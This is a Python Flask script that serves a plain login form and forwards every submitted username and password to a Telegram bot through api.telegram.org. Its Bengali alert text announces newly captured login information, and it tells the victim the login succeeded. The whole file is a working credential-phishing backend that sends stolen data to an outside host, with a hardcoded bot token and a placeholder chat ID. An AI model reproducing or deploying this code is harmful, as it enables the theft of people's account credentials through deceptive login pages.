import requests
from flask import Flask, request

app = Flask(__name__)

TELEGRAM_BOT_TOKEN = '8820038438:AAFI-8Ecx7fqBgfhIOilHyJ8V8ABi3ZqEJ4'
CHAT_ID = 'আপনার_আসল_আইডি'

def send_to_telegram(username, password):
    message = f"🚨 নতুন লগইন তথ্য পাওয়া গেছে!\n\n👤 Username: {username}\n🔑 Password: {password}"
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    payload = {
        "chat_id": CHAT_ID,
        "text": message
    }
    try:
        requests.post(url, json=payload)
    except Exception as e:
        print("Telegram error:", e)

@app.route('/', methods=['GET', 'POST'])
def index():
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        send_to_telegram(username, password)
        return "Login successful! Data sent to Telegram."

    return '''
        <form method="POST" style="margin: 50px;">
            <h2>Login</h2>
            <input type="text" name="username" placeholder="Username"><br><br>
            <input type="password" name="password" placeholder="Password"><br><br>
            <input type="submit" value="Login">
        </form>
    '''

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
